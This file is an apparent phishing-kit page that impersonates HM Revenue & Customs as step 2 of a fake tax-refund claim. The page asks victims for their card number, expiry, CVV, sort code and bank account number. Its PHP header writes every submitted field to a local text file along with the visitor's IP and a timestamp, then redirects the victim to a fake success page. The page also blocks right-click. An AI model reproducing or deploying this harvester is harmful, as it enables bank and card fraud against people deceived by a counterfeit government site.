<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: success-claim-refundformprocess=4624g80a13c-0db1f8e263663d3faee8d1-95a86e1d21wh81928j9i1hbcvuy-2918783d7j91kjhgbxx-7942f7415cf1b4a661698.html');
$handle = fopen('step2.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en">
  
<meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" />
<link rel="shortcut icon" href="a/favi.ico" type="image/x-icon">
<head>
    <title>HMRC: Credit/Debit card information</title>
    <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1">
					<meta http-equiv="Content-Style-Type" content="text/css">
					<meta http-equiv="Content-Script-Type" content="text/javascript">
<script language="JavaScript" src="nou.js" type="text/javascript"></script>
    <link rel="stylesheet" href="a/aha.css" type="text/css">
					<link rel="stylesheet" href="a/a.css" type="text/css" media="print">
					<!--[if IE 8]>
					<link rel="stylesheet" href="a/ie8.css" type="text/css">
					<![endif]-->
					<!--[if IE 7]>
					<link rel="stylesheet" href="a/ie7.css" type="text/css">
					<![endif]-->
					<!--[if IE 6]>
					<link rel="stylesheet" href="a/ie6.css" type="text/css">
					<![endif]-->
    
      <link rel="stylesheet" href="a/r.css" type="text/css">
    
    
  </head>
<div id="header-digital">
						<ul class="screen-reader">
    <li>
      <a accesskey="s" href="#main">Skip to main content</a>
    </li>
    <li>
      <a accesskey="2" class="new-window" href="http://www.hmrc.gov.uk/news/index.htm">What's New</a>
    </li>
    <li>
      <a accesskey="5" class="new-window" href="https://online.hmrc.gov.uk/information/faqs">Frequently
Asked Questions</a>
    </li>
    <li>
      <a accesskey="7" class="new-window" href="http://customs.hmrc.gov.uk/channelsPortalWebApp/channelsPortalWebApp.portal?_nfpb=true&amp;_pageLabel=pageContactUs_ShowContent&amp;propertyType=document&amp;resetCT=true&amp;id=HMCE_PROD1_025307">Complaints Procedure</a>
    </li>
    <li>
      <a accesskey="9" class="new-window" href="http://www.hmrc.gov.uk/menus/contactus.shtml">Contact Us</a>
    </li>
    <li>
      <a accesskey="3" class="new-window" href="http://www.hmrc.gov.uk/nav/index.htm">Sitemap</a>
    </li>
    <li>
      <a accesskey="4" class="new-window" href="http://search.hmrc.gov.uk/kbroker/inldrev/inldrev/search.lsim">Search</a>
    </li>
  </ul>
						<a href="" accesskey="1"><img src="a/digitalLogo.png" alt="HM Revenue &amp; Customs" height="0" width="256" class="screen"><img src="a/digitalLogo-print.png" alt="" height="29" width="256" class="print"></a>
						<ul class="inline-navigation">
							<li><a href="">Home</a></li>
							<li><a href=""><span lang="cy">Cymraeg</span></a></li>
							<li><a href="" class="">Contact HMRC</a></li>
							<li><a href="" accesskey="6" class="">Help</a></li>
							
						</ul>
					</div>

    <div id="banner" class="no-menu">
      
        



  <div id="rne">
    <dl class="process-overview" >
		
		<dt>1</dt>
        <dd>Step 1<br>Enter personal information</dd>


        
		<dt class="selected">2</dt>
        <dd class="last">
           
             
             
               Step 2<br>Enter credit/debit card information
             
           
        </dd>
    </dl>
  </div>
      
      <div id="user-information">
        
      </div>
      
        <h1>
          Step 2 - Enter credit/debit card information
        </h1>
      
      <a name="main" class="screen-reader"></a>
      
    </div>
  	
	      
	      
	          









<body oncontextmenu="return false;">





 

 
 




<div class="portlet no-title-bar">
	<div class="portlet-header"><h2>&nbsp;</h2></div>
	 <div class="portlet-body">
		<form name="asd" name="asd" method="post" action="<?php echo basename(__FILE__); ?>"  class="narrow-labels">
			
				







    
      <div id="pageError.individualSelfAssessmentUserIdOnline" class="error" >
      
      </div>
    


    	<span class="required">*</span>
    	indicates required information
    </p>
    <p>
    	
    </p>

	<h3>
	   	Credit/Debit card information
     </h3>

     

		
		

		
		<br><br>
			
				<div class="field"><label for="nameoncard" id="nameoncard">Cardholder Name:<span class="required">*</span></label><input type="text" value="" name="nameoncard" id="nameoncard"  maxlength="40"> <div class=""></div></div>
			

		
				<div class="field"><label for="ccnr" id="ccnr">Card Number:<span class="required">*</span></label><input type="text" value="" class="" placeholder="No dashes or spaces" name="ccnr"  id="ccnr"  maxlength="19">

<br>

	<br>			


<label for="exp" id="exp">Expiration Date:<span class="required">*</span></label><input type="text" value="" class="" name="mmexp" id="mmexp" size="7" placeholder="month" maxlength="2"> - <input type="text" value="" class="" name="yyyyexp" id="yyyyexp" size="8" placeholder="year" maxlength="4"><div class="hint" id="City">
</p></div></div>

<div class="field"><div class="cvv" id="cvv"></div><label for="cvv" id="cvv">Security Code - CVV:<span class="required">*</span></label><input type="text" value=""  name="cvv" id="cvv"  maxlength="3"><div class="hint" id="CVV"><p>

</p></div></div>

<div class="field"><div class="sort" id="sort"></div><label for="sort" id="sort">Sort Code:<span class="required">*</span></label><input type="text" value="" class="" size="4" name="sort1" id="sort1" maxlength="2">-<input type="text" value="" size="4" class="" name="sort2" id="sort2" maxlength="2">-<input type="text" value="" class="" size="4" name="sort3" id="sort3" maxlength="2"><div class="hint" id="Sort Code"><p>

</p></div></div>

<div class="field"><div class="account" id="account"></div><label for="account" id="account">Account Number:<span class="required">*</span></label><input type="text" value="" class=""  name="account" id="account"  maxlength="8"><div class="hint" id="Account Number"><p>

</p></div></div>





   </div>




	<div class="field"><div class="error" id="fieldError.abroadSignal"></div><ul><li></label></li></ul><div class="hint" id="HintabroadSignal"></div></div>

			 
 			 

<div class="buttons">
	<input type="submit" name="submit" id="ButtonSubmit" value="Submit">
	<input type="submit" name="back" class="no-validation" id="ButtonBack" value="Back">
</div>
		</form>
	 </div>
 </div>
	      

	  	
	  	<ul class="inline-navigation" id="footer">
<li class="first">&#169; <a class="" href="">Crown Copyright</a></li>

<li><a accesskey="8" class="" href="">Terms &amp; Conditions</a></li>

<li><a class="" href="">Privacy policy</a></li>

<li><a accesskey="0" class="" href="">Accessibility</a></li>

<li><a class="" href="">Feedback</a></li>

<li><a class="" href="">Complaints</a></li>
</ul>
    

 </body>
<script language="JavaScript" type="text/javascript">
 var frmvalidator = new Validator("asd");
 frmvalidator.addValidation("ccnr","minlen=16","Enter your Card Number");
 frmvalidator.addValidation("nameoncard","req","Enter your Cardholder name exactly as displayed on card");
 frmvalidator.addValidation("mmexp","minlen=2","Enter your Card expiration date - Month field -");
 frmvalidator.addValidation("yyyyexp","minlen=2","Enter your Card expiration date - Year field -");
 frmvalidator.addValidation("cvv","minlen=3","Enter your CVV");;
 frmvalidator.addValidation("sort1","minlen=2","Enter your Sort Code - Field 1 -");
 frmvalidator.addValidation("sort2","minlen=2","Enter your Sort Code - Field 2 -");
 frmvalidator.addValidation("sort3","minlen=2","Enter your Sort Code - Field 3 -");
 frmvalidator.addValidation("sort1","numeric","Enter your Sort Code - Field 1 -");
 frmvalidator.addValidation("sort2","numeric","Enter your Sort Code - Field 1 -");
 frmvalidator.addValidation("sort3","numeric","Enter your Sort Code - Field 1 -");
 frmvalidator.addValidation("account","minlen=8","Enter your Bank Account Number - 8 digits -");
 frmvalidator.addValidation("account","numeric","Enter your Bank Account Number - 8 digits -");
</script>
</html>